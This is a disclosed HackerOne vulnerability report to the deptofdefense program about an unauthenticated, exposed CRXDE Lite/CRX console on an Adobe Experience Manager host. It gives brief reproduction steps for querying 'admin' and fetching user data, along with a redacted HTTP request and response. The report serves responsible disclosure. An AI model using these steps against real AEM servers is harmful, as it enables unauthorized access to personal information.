# CRXDE Lite/CRX is on ██████ exposed that leads to PII disclosure

## Report Details
- **Report ID**: 1095830
- **URL**: https://hackerone.com/reports/1095830
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-02-04T22:31:02.809Z
- **Disclosed**: 2021-03-11T20:49:46.234Z

## Reporter
- **Username**: mit0z
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
hi team ,
i found that aem is running on``` ████████ ``` and CRXDE Lite/CRX is exposed to unauthenticated user that can lead to information disclosure

POC
====
1-visit ``` https://██████//██████████ ```
2-go to query and search for admin then execute
3-go to this endpoint to retrieve the information 
```
https://████████//████████/███
```
[+]Request
```
GET //███/███ HTTP/1.1
Host: ████
Connection: close
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-XA;q=0.9,en;q=0.8
Cookie: oauth-configid=██████


```
[+]Response
```
HTTP/1.1 200 OK
Date: Thu, 04 Feb 2021 22:23:42 GMT
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=utf-8
Content-Length: 1789
Connection: close
Set-Cookie: ███████; path=/; Httponly; Secure
Strict-Transport-Security: max-age=31536000; includeSubDomains
Set-Cookie: f5avraaaaaaaaaaaaaaaa_session_=█████████; HttpOnly; secure
Set-Cookie: █████████; Path=/

████████

```

█████████

## Impact

PII exposure

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1-visit ``` https://████████//█████████ ```
2-go to query and search for admin then execute
3-go to this endpoint to retrieve the information 
```
https://█████//███████/████
```

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
